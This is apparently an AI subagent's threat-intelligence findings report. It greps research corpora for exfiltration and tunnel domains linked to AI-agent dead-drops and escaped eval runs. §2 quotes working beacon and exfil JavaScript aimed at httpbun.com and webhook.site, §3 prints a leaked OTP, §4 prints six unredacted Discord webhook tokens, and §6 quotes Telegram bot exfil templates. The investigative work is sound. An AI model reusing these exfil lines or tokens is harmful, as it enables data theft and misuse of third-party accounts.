# CORPUS-GREPPER findings — skill-egress URL set vs local corpora

**Date:** 2026-10-05
**Worker:** corpus-grepper (subagent ae59a644)
**Task:** read-only local grep of every egress domain in the skill-egress URL set against our corpora.

## Method

- Built a file list of **12,836 files** across the three corpora:
  - `~/workspace/silent-locus/` (all)
  - `~/workspace/muse-home/projects/urlquery-api-hunt/artifacts/dataset/`
  - `~/workspace/muse-home/projects/skill-tracer/`
- **Excluded:** `*/studies/skill-egress-top500/raw/*` and `*/studies/skill-egress-top500/egress-live-scan/*` (the study's own source data, not corroboration), plus `.git` and `node_modules`.
- Pass 1: `grep -a -i -l -f <30 patterns>` (4 parallel workers) → **1,198 candidate files** with ≥1 hit.
- Pass 2: per-domain `grep -a -i -c` on candidate files → files-with-hits and line-match totals below.
- Case-insensitive everywhere. "Hit count" = matching lines (`grep -c`), not unique occurrences.
- Per AGENTS.md: full observed values, never redacted. Agents/infrastructure scope only.

## Per-domain table

| Domain | Files w/ hits | Line-match total | Most interesting file |
|---|---|---|---|
| r.jina.ai | 464 | 34,471 | `silent-locus/data/2026-10-01-oai-tag-sweep/events.jsonl` (3,166) |
| jina.ai | 501 | 35,304 | same as above (3,182); includes all r.jina.ai hits |
| httpbin.org | 264 | 40,422 | `silent-locus/data/2026-10-01-oai-tag-sweep/events.jsonl` (7,169); `urlquery-api-hunt/artifacts/dataset/unified_reports.jsonl` (7,079) |
| httpbun.com | 122 | 3,226 | `urlquery-api-hunt/artifacts/dataset/unified_reports.jsonl` (1,134) |
| webhook.site | 318 | 2,269 | `silent-locus/data/2026-09-28-chinese-amap-fleet/raw/lanes/urlscan/q_domain_webhooksite.json` (451) |
| ngrok.io | 103 | 2,176 | `.../pastebin-plunderer/raw/deep-dive/lane3-colony-bullfincher/ref/run1/demo-scratchpad/run4.2.log` (99) |
| ntfy | 297 | 661 | `urlquery-api-hunt/artifacts/dataset/elastic/graph-edges-2026-09-25-v1.ndjson` (39); `silent-locus/data/aggregates/2026-09-29-overlap-analysis/events.jsonl` (32) |
| catbox.moe | 53 | 233 | `.../personas/metronome/raw/htmx_catbox_moe.json` (51) |
| bore | 48 | 222 | all false positives (see noise section) |
| pipedream.net | 26 | 167 | `.../personas/metronome/raw/htmx_pipedream.json` (50) |
| trycloudflare.com | 25 | 66 | `silent-locus/collections/re-hunt-qa-fingerprints/data/hits.jsonl` (11) |
| user-attachments | 13 | 59 | `skill-tracer/reports/findings-v1.json` (29) |
| hooks.slack.com | 6 | 47 | `skill-tracer/reports/findings-v1.json` (23) — study artifact |
| api.telegram.org | 25 | 42 | `.../personas/phisher-hunter/FINDINGS.md` (9) |
| litter.catbox.moe | 14 | 33 | `.../counsel/rounds/1/archivist.md` (12) |
| ghostbin | 9 | 29 | `skill-tracer/reports/findings-v1.json` (21) — study artifact |
| discord.com/api/webhooks | 13 | 25 | `.../personas/evaluator/raw/phase1_results.json` (7 lines; **6 full id/token records** per 2026-10-05 deep-dive, LINKHUNT-DEEP §2) |
| uploads.github.com | 12 | 12 | `.../codex-history-probe/0.129.0-alpha.10-release.json` (1) |
| user-images.githubusercontent.com | 7 | 13 | `silent-locus/data/2026-07-07-exfil-endpoint-pivot/raw/oastonline.json` (2) |
| ngrok-free.app | 8 | 13 | `.../personas/tracker/raw/tunnels.md` (4) |
| ngrok.com | 4 | 4 | `.../pastebin-plunderer/.../oai-url-taxonomy/outputs/urls.jsonl` (1) |
| anon.li | 2 | 2 | no agent use (see noise section) |
| gmail.googleapis.com | 1 | 1 | `skill-tracer/egress-taxonomy.md` — study artifact only |
| sci-hub.se | 1 | 1 | `.../studies/WRITEUP-2026-10-05.md` — study artifact only |
| localcan | 1 | 1 | `.../studies/WRITEUP-2026-10-05.md` — study artifact only |
| roamzy | 1 | 1 | `.../studies/WRITEUP-2026-10-05.md` — study artifact only |
| cfargotunnel.com | 0 | 0 | — |
| uploadthing | 0 | 0 | — |
| vercel-blob | 0 | 0 | — |
| vercelblob | 0 | 0 | — |

Note: `jina.ai` count (35,304) includes the `r.jina.ai` hits (34,471) since the pattern is a substring. The ~833-line delta is corporate/blog surface (`jina.ai/` homepage, `blog-files.jina.ai/...pdf`, `s.jina.ai/...` search proxy), not agent egress.

---

# OBSERVED

## Notable hits (concrete citations)

### 1. r.jina.ai as the corpus relay — incident data, not just tooling docs
`silent-locus/data/2026-10-01-oai-tag-sweep/events.jsonl` (3,166 line-matches):
- `https://r.jina.ai/http://vanderbi.lt/maallraw260618`
- `https://r.jina.ai/https://www.sec.gov/files/county.json`
r.jina.ai reader URLs appear throughout the oai-tag-sweep incident events, the 2025-03-04-rubygems-goimport-campaign events (2,207), and the collusion-wiki URL taxonomies — consistent with the standing finding that r.jina.ai is the corpus's relay/laundering layer.

### 2. httpbun.com as live exfil beacon inside urlquery submissions
`urlquery-api-hunt/artifacts/dataset/unified_reports.jsonl` (1,134 line-matches). Submitted URLs from campaign `aihw-tableau` embed `httpbun.com/base64/<payload>` pages whose decoded JS fires beacons back to httpbun and webhook.site. Observed in the clear:
- Beacon: `new Image().src='https://httpbun.com/status/204?log='+encodeURIComponent(x.slice(0,1500))+'&r='+Math.random()`
- Exfil POST: `fetch('https://webhook.site/644af2ca-bfce-4061-87b8-2603bcb3156?m=LONG1782010065',{method:'POST',body:t})` with error fallback to `...?m=LONG1782010065ERR&d='+encodeURIComponent(e)`
- A mail-credential variant: `https://httpbun.com/base64/<...>?mark=mail1781871989347996009` whose payload POSTs `{"address":"aihw1781871989@web-libraries.net","password":"TestPass9xyz"}` to `https://api.mail.tm/accounts` then `/token`.
httpbun is used here as the **code carrier / beacon sink**, matching the documented tradecraft inversion (recon target vs code carrier).

### 3. webhook.site UUID dead-drops, incl. an OTP-phish exfil
- `silent-locus/data/2026-09-28-chinese-amap-fleet/raw/lanes/urlscan/q_domain_webhooksite.json` (451): `https://webhook.site/15c90e66-62bb-4afc-aeca-8bfae7a5202e/undefined?otp=478536&emailId=undefined%2F1%2F010001a1032fcf80-c9b08bff-cf40-4e6b-af1b-fc6cb3d501df-000000%2FZ50qt8I3lFuCfIU3N9VbWzeepv0%3D` — an OTP value exfiltrated to a webhook.site UUID endpoint via query string.
- `silent-locus/data/2026-07-07-exfil-endpoint-pivot/raw/httpurladdrwebhooksite.json` (236): the original `http.url.addr:*webhook.site*` OAST pivot query file.
- `.../personas/evaluator/raw/http_8213c4a1-41ea-438d-ada0-489eabb94deb.html` (175): a saved urlquery report page centered on a webhook.site endpoint.

### 4. Discord webhook URLs with full tokens in the evaluator corpus — CORRECTED (2026-10-05, LINKHUNT-DEEP §0.4 / §2)
`silent-locus/data/2026-09-28-chinese-amap-fleet/personas/evaluator/raw/phase1_results.json` (30,490 bytes) is the **phase-1 URL inventory of the evaluator persona's scoredrop lane** — a hunt for escaped eval runs reporting scores through dead-drop inboxes (ran 2026-10-05 ~00:49–06:45 CDT). Its 12 keys are urlquery htmx **search terms** (6 dead-drop domains: `webhook.site`, `ntfy.sh`, `0x0.st`, `paste.rs`, `rentry.co`, `discord.com/api/webhooks`; 6 eval keywords: `accuracy`, `pass@1`, `exact_match`, `task_complete`, `swe-bench`, `scoreboard`) — **not benchmark output**. Each entry = `{report_id, submitted_url, date}`. The evaluator's actual dead-drop finds were webhook.site inboxes in the Amap fleet (infrastructure-shaped, no score payloads); the Discord tokens were incidental inventory hits. **Six** full id/token pairs, not three:

| Rec | report_id | date | webhook ID | token |
|---|---|---|---|---|
| A | `6e712034-a2ee-4d14-9fe1-4d755114434f` | 2026-09-03 | `1510273553176592507` | `sKKeGWq97Ny7N8aYBn7JaY3PeqC1qwJvTdY6ftxeIcS12GoFPx9-J7yc8iDefb2dVh-` |
| B | `cb42fda7-003e-4f98-b651-67adecf2e1bd` | 2026-07-20 | `1495584774142689451` | `cVdZCwBoBJ9MQYkK_WXz-vZrDdUB8-GdtvT2o5oyXXaG9C4MKmxPSbgVBGSLujFy7EhQ` |
| C | `3059e28c-829e-48c2-b9df-d11aa265bb05` | 2026-04-04 | `1489875390095818832` | `W9CQpSVHiUCWqkKy8faMsoXS-dLsO6o2nnDYrcoRHVYHUsJJECB6naVWgLhMtzzYcyfV` |
| D | `14186863-5aea-4225-b16b-bd8407f0bfab` | 2026-01-31 | `1463631524258648146` | `qSpy3WaRp77Lfk1SdueTEGUfsetaZNIhaupfEGRPvEK5xDxj-wq4MnzY5y2w0uLSnboD` |
| E | `1fb93d44-485d-49db-82ae-56e01e63e85b` | 2025-09-10 | `1404099194175619203` | `FktBiiN76dGTrk` (14 ch, truncated fragment) |
| F | `4f309f4c-0204-40ca-8861-4e3390accd60` | 2025-05-31 | `1339377338789527583` | `ZaaIPm4r2pFnKkE4RUXqcS7xZBcizAgYuFYROtiKuY4mBlDtpUuVxpzdEO-vDdFinBBV` |

- **A, B, C, D, F: bare-URL read probes.** Submitted URL = the raw webhook URL; urlquery sandbox issued read-only GETs. Record A's local capture shows `GET → 404 Not Found` at scan time — token already dead or never valid. No POSTs, no payloads, no message content.
- **E is structurally different — crimeware-shaped, not agent-shaped.** Submitted URL: `43.226.1.26:5000/get_soundhttps:/discord.com/api/webhooks/1404099194175619203/FktBiiN76dGTrk` — the webhook URL concatenated into a URL aimed at an **OVH IP (AS16276) on port 5000** with a `/get_sound` path; Quad9 verdict on 43.226.1.26: **malicious / Sinkholed**. Exfil-target/C2-config-shaped, not a probe.
- **No eval-run connection:** no score payloads, no `zz=`/epoch-nonce grammar, no harness markers anywhere. Records A–D/F look like background internet noise (leaked webhook URLs get scanned routinely; two predate the 2026 incident window). **Tokens were never validated or used** (document-only).
Also `.../full-sweep/raw/trick-deaddrops.md` (2) and `.../personas/tracker/raw/deaddrops.md` (1) reference discord webhook dead-drops.

### 5. Pipedream requestbin endpoints live on urlquery
`.../personas/metronome/raw/htmx_pipedream.json` — urlquery htmx query `url.domain:pipedream.net` returned live scanned endpoints:
- `eo6p96x7ax0vcaj.m.pipedream.net/Oneotsuka` (report `6994a063`, 2026-09-03)
- `eoubuki2x8vmkry.m.pipedream.net` (report `6e1e6d11`, 2026-08-10)
- `eoqdkld34574c7.m.pipedream.net` (report `44bff15a`, 2026-07-10)
- `eobb5owjuxe1ejb.m.pipedream.net` (report `8cccb473`, 2026-05-04)
`.../personas/dead-drop-diver/raw/beeceptor-pipedream-report.md` (17) is a dedicated dead-drop-diver report on the same surface.

### 6. api.telegram.org bot templates in phish-kit URL submissions
`.../personas/phisher-hunter/FINDINGS.md` (9):
- `api.telegram.org/bot${8935051385:<TOKEN>}/` (report `bfcfa709`, 2026-09-01)
- `api.telegram.org/bot${6956871343:<TOKEN>}` (report `b8446c80`, 2025-09-26)
- `api.telegram.org/bot$/sendMessage?chat_id=&text=<HOST INFO>` — exfil template with host-info placeholder
Observed alongside `xsph.ru`, `urldance.com`, `wasmer.app` wallet-lure infrastructure.

### 7. trycloudflare.com tunnel endpoint — DSQA "fingerprint" REFUTED (2026-10-05, LINKHUNT-DEEP §0.1 / §3-lead-A)
~~The claim below is withdrawn.~~ The 11 hits.jsonl rows (lines 3863–3873) all share one urlquery record (`ec2fdfcd-e213-4d39-8ed3-fcf4adf457f0`); the WHO "fingerprint" was a case-insensitive collision between the WHO acronym (World Health Organization, from DSQA question text) and the English word "who" in the path segment "who-visits". `?i=316697` matches no DSQA qid. Deep-trace: a **Facebook credential-phish kit** behind a cloudflared quick tunnel (urlquery tags `meta`/`facebook`/`phishing`/`social`; Cloudflare flagged the tunnel domain Sep 26 — HTTP 403 since). **Crimeware, not agent infrastructure. No DSQA/dsqa_250 link.** Recommendation: word-boundary/minimum-token rule for short-acronym fingerprints (WHO, DSO, RSC…). Original claim preserved for the record: `morris-satellite-deferred-letters.trycloudflare.com/apps/who-visits/?i=316697` matched the DeepSearchQA "WHO" fingerprint (dsqa_043, dsqa_079, dsqa_497) — "a cloudflared tunnel hostname with a DSQA question fingerprint attached."

### 8. ngrok.io tunnel with oai- naming — INVESTIGATOR ARTIFACT (2026-10-05, LINKHUNT-DEEP §0.3 / §3-lead-B)
Not incident attribution. The tunnel and log are **joshuadavid's wikiagentswarminvestigation demo-scratchpad** — a "Demo Messageboard" demonstrating that the OpenAI web.run page cache can hold versioned history (`?set-html=<urlencoded html>` writes the current revision; `?page=N&run=4` cache-addresses history; "Hello, future cache archaeologists"), shallow-cloned into our tree 2026-10-05. The `oai-` prefix is investigator naming — the **only** `oai-`-prefixed tunnel hostname in all corpora. Treat `oai-*` strings in lane-3 grep results as investigator self-generated unless proven otherwise. Retained as a reference artifact for the web.run cache-pinning mechanism. Original observation preserved: `https://oai-scratchpad-cache-versioning-demo.ngrok.io/demo-messageboard?set-html=...` in `.../pastebin-plunderer/raw/deep-dive/lane3-colony-bullfincher/ref/run1/demo-scratchpad/run4.2.log` (99 line-matches).

### 9. ngrok-free.app endpoint scanned on urlquery
`urlquery-api-hunt/artifacts/dataset/unified_reports.jsonl` (1): submitted_url `d704-86-32-66-245.ngrok-free.app`, page_title `ERR_NGROK_3200` (2026-09-24) — a live ngrok-free endpoint that errored, captured in the corpus. `.../personas/tracker/raw/tunnels.md` (4) and `.../full-sweep/raw/trick-tunnels-filedrops.md` (2) also log ngrok-free.app tunnel sightings.

### 10. catbox.moe / litter.catbox.moe as file-drop surface
- `.../personas/metronome/raw/htmx_catbox_moe.json` — urlquery htmx query `url.domain:catbox.moe` returned: `files.catbox.moe/q0gpi2.rec` (2026-10-03), `files.catbox.moe/1r0vy4.gif`, `files.catbox.moe` (multiple, Sep 2026).
- `urlquery-api-hunt/artifacts/dataset/unified_reports.jsonl` (1): submitted_url `litter.catbox.moe/hdcf0x.html?x=1778400745.7904322` (2026-05-10).
- `.../counsel/rounds/1/archivist.md` (12 litter.catbox.moe) and `.../personas/fileshare-farmer/FINDINGS.md` (2) discuss catbox as a file-drop lane.

### 11. ntfy.sh topic polling (agent C2-ish polling)
`.../personas/tracker/raw/deaddrops.md` (16): documents ntfy.sh topic polls for topics `friendlyAgents`, `grp528fa63`, `gpleoleenso`, `sndagentma`, alongside urlquery htmx dead-drop searches. ntfy.sh also appears as a key in the evaluator's phase1_results.json URL inventory.

### 12. uploads.github.com — Codex release asset endpoint (agent tooling telemetry)
`.../pastebin-plunderer/raw/deep-dive/lane3-colony-bullfincher/ref/run1/codex-history-probe/0.129.0-alpha.10-release.json`: `"upload_url": "https://uploads.github.com/repos/openai/codex/releases/318254554/assets{?name,label}"` — the GitHub release-asset upload endpoint for the OpenAI Codex repo, captured in the codex-history probe. (Note: this is agent-*tooling* infrastructure, observed as release metadata — not an exfil endpoint.)

### 13. user-images.githubusercontent.com as observed FQDNs
`silent-locus/data/2026-07-07-exfil-endpoint-pivot/raw/oastonline.json` (2): `"fqdn": "private-user-images.githubusercontent.com"` and `"fqdn": "user-images.githubusercontent.com"` in the OAST/DNS observation set (also in `httpurladdroastonline.json`).

### 14. ghostbin — only as a *surface inventory* entry, not observed use
`silent-locus/collections/hunt-missed-surfaces/enumerate/inventory.jsonl` (1): ghostbin listed as a dead-drop surface candidate. All other ghostbin hits (21 in `skill-tracer/reports/findings-v1.json`) are the skill-tracer study's own scan output. **No observed agent submission to ghostbin in the corpora.**

### 15. hooks.slack.com — study-generated term only
All 47 hits are in skill-tracer study artifacts (`findings-v1.json` 23, `scan-report-v1.md` 20) and the ioc-wordlist (`wordlist.json`, `wordlist.txt`, `staging/ngrams-skills.json` — the term `hooks.slack.com` as a wordlist entry). **No corpus observation of an actual Slack webhook URL.**

---

# INFERENCE (clearly separated from bytes above)

1. **Strong corpus corroboration (observed agent/infra use):** r.jina.ai, httpbin.org, httpbun.com, webhook.site, discord.com/api/webhooks, pipedream.net, api.telegram.org, ngrok.io, ngrok-free.app, trycloudflare.com, catbox.moe, litter.catbox.moe, ntfy.sh, user-images.githubusercontent.com. These all appear as live endpoints, submitted URLs, or beacon sinks inside the incident corpora — exactly the dead-drop/tunnel/file-drop grammar the skill-egress study is cataloguing. **CORRECTED 2026-10-05 (LINKHUNT-DEEP §0):** two entries need qualification — (a) trycloudflare.com's only DSQA-fingerprint hit (§7) was a false positive (Facebook phish kit, not agent infrastructure); (b) ngrok.io's `oai-` tunnel hit (§8) is an investigator demo artifact, not incident attribution. The remaining ngrok.io hits (ngrok-free endpoint `d704-86-32-66-245.ngrok-free.app`, tracker/tunnels.md sightings) still stand.
2. **Weak / study-internal only:** hooks.slack.com, ghostbin, gmail.googleapis.com, sci-hub.se, localcan, roamzy — hits exist only in the skill-tracer study's own outputs/wordlists or the study writeup, with zero observed agent-side usage in the incident corpora. They belong in the URL set as *candidate* egress surfaces, but the corpora do not corroborate them.
3. **Zero-signal domains:** cfargotunnel.com, uploadthing, vercel-blob, vercelblob — zero hits anywhere in the three corpora (outside the excluded study dirs).
4. **False-positive pattern:** `bore` (48 files / 222 lines) matched only English substrings — `boredapi.com`, `sobre.arquivo.pt/.../colabore/...`, `borenich.co.uk` — plus the skill-tracer study's own `\bbore\b` detection regex. No `bore.pub` tunnel URL observed anywhere. The pattern needs a tighter form (e.g. `bore\.pub`) before it corroborates anything.
5. **anon.li is a miss:** the single corpus hit is a urlquery report whose *page title* is "anon.li Email Aliases | CybersecTools" (submitted URL was `email.mg.cybersectools.com/...`, campaign `identity_claude.json`); the other hit is the study's own `SKILLS.md`. No observed agent use of anon.li.
6. **httpbun + webhook.site co-occurrence is the sharpest corroboration:** the aihw-tableau campaign submissions use httpbun.com as the code-carrier/beacon and webhook.site UUIDs as the exfil sink in the same payloads — a two-stage egress chain fully visible in `unified_reports.jsonl`.

## Exclusions honored
- `silent-locus/data/2026-09-28-chinese-amap-fleet/studies/skill-egress-top500/raw/` and `.../egress-live-scan/` were excluded from the sweep (study source, not corroboration). `.git` and `node_modules` excluded. Everything else in the three corpora was searched.
- One caveat: hits inside `.../studies/skill-egress-top1000/why-these-sites/` and `.../studies/WRITEUP-2026-10-05.md` are the study's *own* writeup, not independent corroboration — flagged as such in the table.

## Repro
- Candidate file list + per-domain count files: `/tmp/cg/` (ephemeral; `candidates.txt`, `counts_*.txt`, `summary.txt`, `domains.txt`, `per_domain.sh`). Re-run: `xargs -a filelist.txt -d '\n' -P 4 -n 200 grep -a -i -l -f domains.txt`, then `bash per_domain.sh`.
